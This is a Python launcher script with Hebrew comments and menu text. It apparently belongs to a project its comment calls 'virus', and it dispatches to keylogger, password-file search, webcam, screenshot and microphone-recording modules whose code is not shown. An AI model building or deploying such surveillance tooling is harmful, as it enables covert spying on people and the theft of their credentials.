import sys
import os

# הוספת הנתיב של `virus` כדי שפייתון יוכל למצוא את `modules`
sys.path.append(os.path.abspath(os.path.dirname(__file__)))

from modules.ListDesktopItems import ListDesktopItems
from modules.FindValuableFiles import FindValuableFiles
from modules.ScreenshotModule import ScreenshotModule
from modules.ScreenCameraShot import CameraShot
from modules.Keylogger import Keylogger
from modules.microphone import MicrophoneRecorder


def main():
    print("\nבחר פונקציה להפעלה:")
    print("1️⃣ רשימת קבצים משולחן העבודה")
    print("2️⃣ חיפוש קבצים עם סיסמאות")
    print("3️⃣ צילום מסך (מצלמת וידאו)")
    print("4️⃣ הקלטת מקשים (Keylogger)")
    print("5️⃣ צילום מסך עם מודול צילום מסך")
    print("6️⃣ הקלטת שמע מהמיקרופון")
    choice = input("\n📌 הכנס מספר: ")

    if choice == "1":
        ListDesktopItems().run()
    elif choice == "2":
        items = ListDesktopItems().list_items()
        FindValuableFiles(items).run()
    elif choice == "3":
        CameraShot().run()
    elif choice == "4":
        Keylogger("keylog.txt").run()
    elif choice == "5":
        ScreenshotModule().run()
    elif choice == "6":
        recorder = MicrophoneRecorder("audio_recording.wav")
        recorder.run()
    else:
        print("❌ בחירה לא תקינה!")

if __name__ == "__main__":
    main()